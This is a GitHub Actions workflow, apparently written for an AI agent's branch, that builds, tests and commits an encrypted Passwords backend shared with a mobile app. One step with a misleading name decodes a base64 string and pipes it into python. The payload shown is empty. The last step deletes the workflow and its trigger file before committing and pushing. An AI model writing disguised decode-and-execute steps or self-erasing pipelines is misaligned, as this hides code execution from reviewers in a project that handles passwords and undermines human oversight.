name: Mobile Passwords backend parity

on:
  push:
    branches:
      - agent/full-mobile-app
    paths:
      - .mobile-passwords-backend-trigger

permissions:
  contents: write

jobs:
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - name: Use npm 11
        run: npm install --global npm@11
      - name: Extend migration regression coverage through V8
        run: printf '%s' '' | base64 -d | python
      - name: Refresh workspace lockfile
        run: npm install --package-lock-only --ignore-scripts
      - name: Strict install
        run: npm ci
      - name: Rebuild SQLite for Node tests
        run: npm run native:node
      - name: Format Passwords backend checkpoint
        run: >-
          npx prettier --write
          packages/contracts/src/passwords.ts
          packages/contracts/src/password-crypto.ts
          packages/core/src/validation/passwords.ts
          packages/persistence/src/passwords.ts
          packages/persistence/src/passwords.test.ts
          packages/persistence/src/mobile-schema-v8.ts
          apps/desktop/src/main/repositories/passwords.repository.ts
          apps/desktop/src/shared/contracts/passwords.ts
          apps/desktop/src/shared/validation/passwords.ts
          apps/mobile/package.json
          apps/mobile/src/app/services.ts
          apps/mobile/src/modules/passwords/passwordCrypto.ts
          apps/mobile/src/shared/storage/sqlite.ts
          apps/mobile/src/shared/storage/sqlite.test.ts
      - name: Typecheck all platforms
        run: npm run typecheck
      - name: Mobile and shared tests
        run: npm run test:mobile
      - name: Desktop Passwords regression tests
        run: >-
          npm exec --workspace=mymind-next -- vitest run
          src/main/repositories/passwords.repository.test.ts
          src/main/ipc/register-passwords-ipc.test.ts
          src/main/services/password-clipboard.test.ts
      - name: Database schema check
        run: npm run db:check
      - name: Expo Android export
        run: npm run export:android
      - name: Whitespace
        run: git diff --check
      - name: Commit verified Passwords backend checkpoint
        env:
          BRANCH: agent/full-mobile-app
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          rm -f .github/workflows/mobile-passwords-backend.yml .mobile-passwords-backend-trigger
          git add -A
          git commit -m "feat: share encrypted Passwords backend with mobile"
          git push origin "HEAD:${BRANCH}"
